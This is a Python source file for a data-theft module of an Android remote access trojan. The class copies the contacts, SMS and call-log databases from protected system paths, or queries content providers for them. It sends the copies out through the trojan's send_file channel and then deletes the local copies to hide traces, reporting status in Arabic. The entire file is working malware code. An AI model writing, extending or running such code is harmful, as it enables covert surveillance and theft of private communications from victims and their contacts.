import os, time, subprocess

class ContactsSMSDumper:
    def __init__(self, rat_instance):
        self.rat = rat_instance

    def dump_contacts(self) -> str:
        paths = [
            "/data/data/com.android.providers.contacts/databases/contacts2.db",
            "/data/data/com.google.android.contacts/databases/contacts2.db",
            "/data/data/com.android.contacts/databases/contacts2.db",
        ]
        dst = "/sdcard/contacts_dump.db"
        for src in paths:
            if os.path.exists(src):
                os.system(f"cp {src} {dst} 2>/dev/null")
                if os.path.exists(dst) and os.path.getsize(dst) > 0:
                    sz = os.path.getsize(dst)
                    sent = self.rat.send_file(dst, f"📇 جهات اتصال ({sz/1024:.1f}KB)")
                    os.system(f"rm -f {dst}")
                    return f"✅ جهات اتصال ({sz/1024:.1f}KB)" if sent else "⚠️ سحب لكن فشل الإرسال"
        return self._content_provider("contacts")

    def dump_sms(self) -> str:
        paths = [
            "/data/data/com.android.providers.telephony/databases/mmssms.db",
            "/data/data/com.google.android.apps.messaging/databases/bugle_db",
            "/data/data/com.android.mms/databases/mmssms.db",
        ]
        dst = "/sdcard/sms_dump.db"
        for src in paths:
            if os.path.exists(src):
                os.system(f"cp {src} {dst} 2>/dev/null")
                if os.path.exists(dst) and os.path.getsize(dst) > 0:
                    sz = os.path.getsize(dst)
                    sent = self.rat.send_file(dst, f"💬 SMS ({sz/1024:.1f}KB)")
                    os.system(f"rm -f {dst}")
                    return f"✅ SMS ({sz/1024:.1f}KB)" if sent else "⚠️ سحب لكن فشل الإرسال"
        return self._content_provider("sms")

    def dump_call_logs(self) -> str:
        paths = [
            "/data/data/com.android.providers.contacts/databases/calllog.db",
            "/data/data/com.android.dialer/databases/calllog.db",
        ]
        dst = "/sdcard/calllog_dump.db"
        for src in paths:
            if os.path.exists(src):
                os.system(f"cp {src} {dst} 2>/dev/null")
                if os.path.exists(dst) and os.path.getsize(dst) > 0:
                    sz = os.path.getsize(dst)
                    sent = self.rat.send_file(dst, f"📞 مكالمات ({sz/1024:.1f}KB)")
                    os.system(f"rm -f {dst}")
                    return f"✅ مكالمات ({sz/1024:.1f}KB)" if sent else "⚠️ سحب لكن فشل الإرسال"
        return "❌ لا صلاحيات"

    def dump_all(self) -> str:
        results = []
        results.append(self.dump_contacts())
        time.sleep(1)
        results.append(self.dump_sms())
        time.sleep(1)
        results.append(self.dump_call_logs())
        return "\n".join(results)

    def _content_provider(self, dtype: str) -> str:
        try:
            if dtype == "contacts":
                output = subprocess.getoutput("content query --uri content://contacts/phones/ --projection display_name:number 2>/dev/null | head -50")
                if output and "Row:" in output:
                    tmp = "/sdcard/contacts_text.txt"
                    with open(tmp, 'w') as f:
                        f.write(output)
                    sent = self.rat.send_file(tmp, "📇 جهات اتصال (نص)")
                    os.system(f"rm -f {tmp}")
                    return "✅ جهات اتصال" if sent else "⚠️ فشل إرسال"
            elif dtype == "sms":
                output = subprocess.getoutput("content query --uri content://sms/ --projection address:body:date 2>/dev/null | head -30")
                if output and "Row:" in output:
                    tmp = "/sdcard/sms_text.txt"
                    with open(tmp, 'w') as f:
                        f.write(output)
                    sent = self.rat.send_file(tmp, "💬 SMS (نص)")
                    os.system(f"rm -f {tmp}")
                    return "✅ SMS" if sent else "⚠️ فشل إرسال"
        except:
            pass
        return f"❌ لا صلاحيات لـ {dtype}"
